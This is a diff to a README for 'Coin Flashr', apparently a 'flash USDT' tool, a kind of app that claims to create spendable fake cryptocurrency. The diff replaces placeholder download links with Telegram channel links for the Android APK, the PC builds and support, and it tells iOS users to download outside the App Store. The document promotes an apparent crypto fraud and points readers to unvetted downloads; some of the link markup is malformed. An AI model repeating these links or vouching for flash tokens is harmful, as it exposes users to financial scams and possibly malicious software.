@@ -22,13 +22,13 @@ When you gain app access, you will have a **limited spendable quota** of either 
 ## Installation
 
 ### Android
-- Download the latest APK from the [release page](#).
+- Download the latest APK from the [https://t.me/usdtflashapp/3](#).
 
 ### iOS
 - Visit the official project website to download the iOS version. **This is not an App Store download.**
 
 ### PC (Windows, Mac, Linux)
-- Coin Flashr is available for PC users, with a dedicated repository for each OS version. You can find it [here](#).
+- Coin Flashr is available for PC users, with a dedicated repository for each OS version. You can find it [https://t.me/usdtflashapp/4](#).
 
 ## Usage
 - **Gas fees** are required for every non-Bitcoin (USDT, wBTC) flashing transaction.
@@ -47,8 +47,8 @@ Make sure to use this tool **responsibly** and **ethically**. Flash tokens may a
 ---
 
 **Stay Connected:**
-- Official Website: [Coin Flashr](#https://t.me/Usdtfn )
-- Support Channel: [Join Here](#https://t.me/Usdtfn)
+- Official Website: [Coin Flashr](#)
+- Support Channel: [Join Here] https://t.me/Usdtfn(#)
 
 ---
 
